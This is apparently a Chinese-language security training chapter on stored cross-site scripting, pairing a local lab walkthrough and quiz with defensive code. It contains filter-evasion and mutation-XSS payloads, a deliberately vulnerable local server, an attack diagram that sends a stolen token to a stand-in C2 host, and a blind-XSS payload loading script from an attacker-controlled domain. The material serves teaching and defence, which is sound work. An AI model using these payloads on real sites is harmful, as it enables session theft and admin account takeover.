# R14.2 儲存型跨站腳本攻擊機制與防禦分析 (Stored Cross-Site Scripting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**儲存型跨站腳本 (Stored Cross-Site Scripting, SXSS)**，又稱**持久型 XSS (Persistent XSS)** 或**二階跨站腳本 (Second-Order XSS)**，是瀏覽器端程式碼注入漏洞中最具殺傷力與傳染性的類別。其漏洞本質在於：**「攻擊者將惡意可執行載荷（JavaScript / HTML）透過常規業務功能（例如留言板、使用者個人資料、富文字文章、工單客服系統或甚至日誌記錄機制）寫入後端持久化儲存媒介（關聯式資料庫、NoSQL、快取層或檔案系統）；當其他受害者（普通使用者、客服、後台最高權限管理者）於日後合法瀏覽受影響頁面時，伺服器自儲存層撈取未經上下文感知輸出編碼或淨化的字串並拼裝至 HTML 檔案中，致使受害者的瀏覽器直譯執行該惡意代碼」**。

與反射型 XSS (R14.1) 依賴即時點擊特定釣魚連結不同，儲存型 XSS 具備**「一對多攻擊擴散性」**、**「完全被動感染」**與**「非同步盲打 (Blind/Asynchronous Exploitation)」**之特徵。一旦載荷植入資料庫，任何存取該資料展示介面的終端皆會無差別淪陷。攻擊者可藉此建立**自傳播 XSS 蠕蟲 (XSS Worm)**、**劫持管理員工作階段實現後台垂直越權**、**靜默安裝持久化瀏覽器後門 (BeEF Hook)** 或**串聯跨站請求偽造 (CSRF) 實現不可逆的特權帳號提權**。

```
[攻擊者] ── 1. POST /api/comments ──► [Web 應用伺服器] ── 2. INSERT ──► [持久化資料庫 (Database)]
(Payload: <img src=x onerror=...>)          │                                   │
                                            ▼                                   │
                                   [儲存成功 (Payload 沉睡)]                    │
                                                                                │
                                                                   3. 管理員登入後台巡檢
                                                                                │
[受害者：後台管理員] ◄── 5. HTTP 200 (帶有惡意腳本) ── [後台伺服器] ◄── 4. SELECT ────┘
         │
         ├─► [瀏覽器 HTML Parser 解析 DOM ➔ 觸發 onerror 事件直譯執行 JS]
         ▼
[以管理員特權身分發起背景請求]
         ├─► a. 提取 document.cookie / LocalStorage JWT Token
         ├─► b. 呼叫 POST /admin/users/create (悄悄新增備份管理員帳號)
         └─► c. 偷渡傳輸：GET http://c2.evil.com/exfil?t={TOKEN} ──► [攻擊者 C2 接收權杖]
```

### 作戰痛點與決策分支
- **痛點場景**：目標業務是富文字編輯器（支援 HTML 排版、圖片上傳），傳統「字元跳脫（如轉義 `<>`）」會導致合法排版排版壞掉（如無法支援 `<b>`、`<p>`、`<img>`），系統採用自研或老舊的正則過濾黑名單；或者輸入端與展示端分離（盲打場景：留言在前端看正常，但在後台內部審核系統被直譯渲染）。
- **決策心流**：
  1. **資料流沉積點與讀取端點識別 (Storage Sink & Render Context Identification)**：
     - 釐清輸入載體（評論區、個人頭像 URL、Markdown 渲染、工單回報、User-Agent/Referer 等請求日誌紀錄）。
     - 判定渲染終端之權限級別：普通用戶前台、租戶內部協同、抑或高特權內部 Admin 管理面板（盲打 XSS / Blind XSS）。
  2. **過濾與淨化架構分析 (Sanitization & Filter Disassembly)**：
     - 目標是否使用富文字過濾器（DOMPurify、sanitize-html、自研 Regex）？
     - 是否存在雙重解碼或解析器語意差異（mXSS / Mutation XSS）？
     - 是否存在富文字屬性利用（如 `<a>` 標籤的 `href="javascript:..."`、`data:` URI 協定）。
  3. **技術邊界鑑別 (Boundary Seams)**：
     - **非反射型 (R14.1)**：Payload 已永久寫入資料庫/檔案系統，請求 URL 本身無需包含惡意代碼，訪客直接瀏覽合法乾淨 URL 即被攻擊。
     - **非 DOM 型 (R14.3)**：資料由伺服器在 Response Body 中直接拼裝回傳，而非完全由前端 JavaScript 自行從儲存 API 取出並以 `innerHTML` 寫入（若後端回傳純 JSON，前端以 `innerHTML` 渲染，則屬 DOM-Based Stored XSS，需結合前端 Sink 分析）。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Vulnerability Mechanics & Physical Structs)

### 1. 儲存型 XSS 漏洞生命週期與雙階非同步模型 (Second-Order Mechanics)
儲存型 XSS 在架構上可拆解為嚴密的兩階段非同步生命週期：

```
+---------------------------------------------------------------------------------------------------+
| 儲存型 XSS 雙階非同步生命週期 (Two-Stage Asynchronous Lifecycle)                                   |
|                                                                                                   |
| [階段 1：污染寫入 (Taint Ingestion)]                                                              |
|   攻擊者 ➔ HTTP POST /tickets ➔ 後端驗證層 (缺乏嚴格 Context-Encoding) ➔ DB 儲存 Raw Payload     |
|   * 特徵：此時攻擊尚未觸發，攻擊者自身收到的回應往往僅為 {"status": "created"} 或簡單重定向。   |
|                                                                                                   |
| [階段 2：沉睡期 (Dormant State)]                                                                  |
|   Payload 在持久化媒介中靜態存儲，可能歷時數分鐘至數週，直到目標端點觸發讀取。                   |
|                                                                                                   |
| [階段 3：非同步觸發與特權劫持 (Trigger & Privilege Escalation)]                                   |
|   管理員 ➔ 存取 /admin/tickets/review ➔ 伺服器自 DB 讀取 Raw Payload ➔ 拼裝進 Admin HTML        |
|   ➔ 管理員瀏覽器 DOM 解析 ➔ 惡意 JS 在高特權上下文 (Admin Origin/Session) 執行！                |
+---------------------------------------------------------------------------------------------------+
```

### 2. 突變型 XSS (Mutation XSS, mXSS) 底層物理機制
當後端或前端在寫入或渲染前使用了 HTML 淨化函式庫（如早期版本的 DOMPurify 或自研過濾器）時，瀏覽器在將「字串」轉換為「DOM Tree」再重新序列化為「innerHTML 字串」的過程中，可能因為 **HTML5 命名空間（如 `<svg>`、`<math>` XML 語意）與常規 HTML 語意切換**，引發語意重構突變，進而將看似無害的標籤在第二次解析時突變為可執行腳本：

```
+---------------------------------------------------------------------------------------------------+
| 瀏覽器 XML/HTML 雙命名空間重構突變流程 (mXSS Mechanics)                                          |
|                                                                                                   |
| 1. 輸入代碼:                                                                                      |
|    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->                 |
|                                                                                                   |
| 2. 第一次解析 (Sanitizer 視角 - XML Namespace):                                                   |
|    Sanitizer 在 <math> 命名空間中運算，將後續內容視為 XML CDATA/註解，認為是安全純文字。         |
|                                                                                                   |
| 3. 瀏覽器重新序列化並寫入 DOM (Browser HTML Parser 視角):                                         |
|    瀏覽器在渲染 <table> 標籤時，觸發 HTML5 語法修正錯誤規律（Foster Parenting），將非法的       |
|    <table> 與 <img> 強制移出 <math> 命名空間，回退至常規 HTML 解析器！                            |
|                                                                                                   |
| 4. 突變結果:                                                                                      |
|    <img> 標籤被拋出註解外，瀏覽器正常解析 <img> 並觸發 onerror=alert(1) 執行！                   |
+---------------------------------------------------------------------------------------------------+
```

## 🥷 第三動：隱匿作戰與防禦規避技術 (Evasion & Anti-Forensics Analysis)

### 1. 繞過基於正則的黑名單過濾 (Regex Evasion)
若目標採用正則替換黑名單（如將 `<script>` 替換為空字串，或過濾空格）：
- **雙寫標籤繞過 (Recursive Replacement Flaw)**：  
  `<scr<script>ipt>alert(1)</script>` ➔ 伺服器將中間的 `<script>` 刪除後，外側字符重新拼接成 `<script>alert(1)</script>`。
- **無空格分隔符利用 (Whitespace-free Separators)**：  
  `<svg/onload=alert(1)>`、`<svg/**/onload=alert(1)>`、`<img\x09src=x\x09onerror=alert(1)>`。
- **大小寫混寫與 NULL Byte 截斷**：  
  `<sCrIpt>alert(1)</ScRipt>`，在特定老舊後端解析器中利用 `%00` 截斷過濾器匹配。

### 2. 富文字過濾器與 DOMPurify 歷史繞過機制分析
若目標採用了客戶端或伺服器端 HTML 淨化函式庫：
- **HTML5 命名空間混淆 (Namespace Juggling)**：  
  利用 `<math>` 與 `<svg>` 的寬容解析機制，將常規 HTML 標籤嵌入其中，欺騙 Sanitizer 使其誤認為該內容屬於非執行性 XML 文本節點。
- **DOM Clobbering 輔助繞過**：  
  利用特製的 HTML 標籤覆寫全域變數或屬性（例如 `<form id="attributes">` 或 `<img name="nodeName">`），導致 Sanitizer 內部在檢查 `node.attributes` 或 `node.nodeName` 時產生未預期型態錯誤（Type Confusion）或邏輯跳過，進而放行惡意標籤。

## 🛡️ 第五動：安全架構加固與修復基線 (Hardening & Remediation Baseline)

### 1. 輸出端上下文感知跳脫與現代前端架構 (Output Encoding by Default)
防範儲存型 XSS 的首要鐵則：**「不要依賴儲存前的清理，而必須在將資料自資料庫取出並渲染至瀏覽器輸出端 (Output Sink) 時，依據當前 HTML 上下文實施徹底的結構編碼」**。

```python
# 伺服器端 Jinja2 / Python 渲染防禦最佳實踐
import html

# 1. 嚴格 HTML Entity 轉義 (針對 HTML Body 上下文)
def render_safe_html(user_stored_input: str) -> str:
    # 確保 & < > " ' 均被轉化為 HTML 實體
    return html.escape(user_stored_input, quote=True)

# 2. 針對 JSON 傳輸至前端之資料，禁止字串拼接，必須使用標準序列化
import json
def serialize_for_script(data_dict: dict) -> str:
    # 確保序列化輸出時不破壞 <script> 區塊，轉義斜線與標籤字元
    return json.dumps(data_dict).replace("<", "\\u003c").replace(">", "\\u003e")
```

### 2. 富文字業務場景：嚴格的 DOMPurify 白名單淨化基線
若業務需求必須允許使用者提交並渲染 HTML 格式文本，必須使用業界權威的淨化庫，並採用**「嚴格標籤與屬性白名單策略」**：

```javascript
// 前端或 Node.js 後端使用 DOMPurify 實施白名單過濾
const DOMPurify = require('dompurify');

function sanitizeRichText(dirtyUserInput) {
    return DOMPurify.sanitize(dirtyUserInput, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'span'],
        ALLOWED_ATTR: ['class'], // 嚴格禁止 id, style, onerror, onclick 等屬性
        ALLOW_DATA_ATTR: false,
        FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'base', 'svg', 'math'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'href', 'src'] // 徹底阻斷事件監聽器與協定注入
    });
}
```

### 3. 縱深防禦：全域 Cookie 屬性與 CSP 限制
```http

Set-Cookie: session_id=s%3A_abc123...; Path=/; Secure; HttpOnly; SameSite=Strict
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本靶場提供極簡二階非同步儲存與渲染環境，模擬留言板注入與盲打展示。

### 1. 靶場核心代碼 (`stored_xss_lab.py`，極簡 30 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import html

# 模擬持久化資料庫儲存庫
COMMENTS_DB = []

class StoredXSSHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 階段一：污染寫入持久層 (Taint Storage)
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='ignore')
        comment = parse_qs(body).get('comment', [''])[0]
        if comment:
            COMMENTS_DB.append(comment)
        
        self.send_response(302)
        self.send_header('Location', '/view')
        self.end_headers()

    def do_GET(self):
        # 階段二：讀取與渲染展示 (Render Sink)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        
        mode = "vulnerable" if "safe=1" not in self.path else "safe"
        rendered = []
        for c in COMMENTS_DB:
            # 依模式決定是否實施 Context-Encoding
            out = c if mode == "vulnerable" else html.escape(c, quote=True)
            rendered.append(f"<li>{out}</li>")
            
        page = f"<h1>留言板</h1><form method=POST><input name=comment><input type=submit></form><ul>{''.join(rendered)}</ul>"
        self.wfile.write(page.encode())

ThreadingHTTPServer(("127.0.0.1", 8142), StoredXSSHandler).serve_forever()
```

### 2. 演練與驗證步驟 (CLI 與 渲染實證)

#### 步驟 1：CLI 發起 POST 請求將 Payload 寫入資料庫
```bash
curl -i -s -X POST "http://127.0.0.1:8142/" -d "comment=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E"
```
**預期回顯**：
- 回應 `HTTP/1.1 302 Found` 重定向至 `/view`，證實載荷已被後端資料庫永久接納。

#### 步驟 2：CLI 請求檢視頁面，確認原始未跳脫之 Payload 已落地渲染
```bash
curl -s "http://127.0.0.1:8142/view"
```
**預期回顯**：
- 回傳內容中包含未編碼之惡意標籤：  
  `<ul><li><img src=x onerror=alert(document.domain)></li></ul>`  
- 任何後續造訪該網址的受害者瀏覽器均會立即解析 `<img>` 並在本地觸發 `alert`。

#### 步驟 3：驗證加固端點之防禦效果
```bash
curl -s "http://127.0.0.1:8142/view?safe=1"
```
**預期回顯**：
- 輸出內容已被完整轉換為實體字元：  
  `<ul><li>&lt;img src=x onerror=alert(document.domain)&gt;</li></ul>`  
- 瀏覽器將其呈現為文字而非可執行節點，攻擊失效。

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 儲存型 XSS 與反射型 XSS 在滲透測試作戰中，最大的殺傷力差異與傳播特性為何？**  
  *分析思路*：反射型 XSS 是一對一、即時性、需要社交工程誘騙點擊惡意 URL 的攻擊；而儲存型 XSS 是一對多、被動觸發、持久存在的攻擊。Payload 植入資料庫後，存取合法頁面的所有使用者與管理員均會無差別執行該代碼。此外，儲存型 XSS 可用來構建具備蠕蟲感染機制的 XSS Worm，在受害者瀏覽期間自動呼叫 API 發表帶有相同 Payload 的新留言，實現幾何級數的自動化擴散。

- [ ] **Q2. 什麼是「盲打 XSS (Blind XSS)」？紅隊在執行盲打時應如何設計監聽機制？**  
  *分析思路*：盲打 XSS 是儲存型 XSS 的一種特殊形態，攻擊者注入 Payload 的介面（如意見回饋、報修工單、註冊名稱、Log 資訊）本身不會回顯內容，而是被非同步同步至隔離的內部後台系統（如內部 CRM、客服系統、SIEM 日誌檢視器）。由於攻擊者無法直接觀測是否觸發，必須使用帶有外部回連特徵的帶外 (Out-of-Band, OOB) 載荷（如 `<script src="https://attacker-oob.com/hook.js">`），當內網管理員打開頁面加載腳本時，C2 伺服器即時擷取管理員的內網 IP、瀏覽器資訊、DOM 結構與權杖。

- [ ] **Q3. 為什麼將資料寫入資料庫前使用 `html.escape()` 進行編碼，往往不是工程上的最佳解，甚至被視為不良實踐？**  
  *分析思路*：如果在輸入端存入資料庫時直接進行 HTML Entity 編碼：
  1. **破壞資料純度與重用性**：該資料未來若要被其他非 HTML 終端消費（如手機原生 App、桌面用戶端、SMS 簡訊系統、PDF 報表產生器），這些終端會直接顯示難看的實體符號（如 `&lt;`、`&quot;`），造成業務顯示失常。
  2. **引發二階雙重編碼漏洞**：若後端不同模組或微服務在取出資料時又做了一次編碼，可能導致不可預期的字串長度膨脹；若特定模組自作聰明反解碼，則可能在重新渲染時重新引入 XSS。最佳工程原則永遠是：「**儲存層保持原汁原味原始資料，唯有在展示層 (Presentation/Sink) 依據最終呈現的具體上下文進行針對性編碼**」。

- [ ] **Q4. 什麼是突變型 XSS (Mutation XSS / mXSS)？為什麼看似經過過濾器清洗乾淨的 HTML 程式碼，寫入 `innerHTML` 後依然會執行惡意腳本？**  
  *分析思路*：mXSS 源於瀏覽器 HTML 解析器在將不可信 HTML 字串解析為 DOM Tree，以及再次序列化為字串時發生的「語法規則重新解釋」。當 Payload 巧妙混合了 HTML5 與 SVG/MathML 的不同命名空間規則時，Sanitizer 在自己的虛擬 DOM 解析時判定其為安全的純文字或註解；但當瀏覽器實際將這串字串指派給 `innerHTML` 時，瀏覽器的容錯機制（如遇到非法嵌套時的標籤強制閉合與節點提升）會打破原有的註解範圍，將隱藏在標籤屬性或註解中的載荷拋回常規 HTML 上下文中，進而「突變」為合法的可執行腳本。

- [ ] **Q5. 針對富文字編輯器（必須允許使用者輸入並渲染排版標籤）的業務場景，如何設計一個兼顧可用性與極致安全性的防禦架構？**  
  *分析思路*：
  1. **採用經受實戰考驗的成熟 Sanitizer**：全面棄用自研正則過濾，採用業界頂級的 DOMPurify 等庫。
  2. **極致嚴格的白名單策略**：嚴格限定允許的標籤集合（只放行 `p`, `b`, `i`, `strong`, `ul`, `li` 等純展示標籤），徹底封殺 `script`, `iframe`, `object`, `svg`, `math`, `base` 等危險標籤；嚴格限定允許的屬性（通常只保留 `class`，全面禁止 `id`, `style`, `on*` 事件）。
  3. **URL 屬性協定嚴格校驗**：若業務允許 `<a>` 標籤的 `href` 或 `<img>` 標籤的 `src`，必須在代碼中強制檢查其協定開頭是否為白名單中的 `http://` 或 `https://`，嚴格阻斷 `javascript:`, `data:`, `vbscript:` 偽協定。
  4. **縱深加固防線**：在伺服器端標頭設定強固的 CSP（禁止 `unsafe-inline`、限制外連源）與 Cookie `HttpOnly`，即使發生極端 Sanitizer 繞過，亦能將損失控制在最小範圍。
